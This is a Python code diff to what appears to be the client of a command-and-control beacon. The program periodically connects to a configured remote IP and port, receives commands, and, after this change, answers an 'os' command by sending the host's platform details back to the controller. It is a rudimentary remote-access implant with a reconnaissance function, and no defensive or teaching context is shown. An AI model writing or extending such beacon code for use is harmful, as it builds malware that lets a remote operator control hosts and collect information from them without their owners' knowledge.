@@ -2,6 +2,7 @@ import socket
 from threading import Thread
 import struct
 from time import sleep
+import platform
 
 # Global Varibales
 
@@ -12,14 +13,23 @@ has_info = 0 # 1--> True, 0 --> False
 cmd_output = ""
 
 def process_cmd(cmd):
-    pass
+    global cmd_output
+    if "os" in cmd:
+        OS = platform.platform()
+        cmd_output = "Operating System :  %s"%(str(OS))
 
 def send_beacons(s):
     global ip,port,inter,has_info,cmd_output
     try:
+        if cmd_output != "":
+            has_info = 1
+        else:
+            has_info = 0
         s.connect((ip,port))
         if has_info == 1:
-            beacon_packet = struct.pack("<%dsHH",cmd_output,has_info,inter)
+            print(cmd_output)
+            beacon_packet = struct.pack("<%dsHH"%(len(cmd_output)),cmd_output.encode(),has_info,inter)
+            cmd_output = ""
         else:
             beacon_packet = struct.pack("<HH",has_info,inter)
         s.send(beacon_packet)
@@ -29,7 +39,7 @@ def send_beacons(s):
         data = struct.unpack("<HH",resp[len_meta_data:])
         if data[0] == 1:
             cmd = struct.unpack("<%ds"%(len_meta_data),resp[:len_meta_data])
-            process_cmd(cmd)
+            process_cmd(cmd[0].decode())
         elif data[0] == 0:
             pass
         if data[1] != inter:
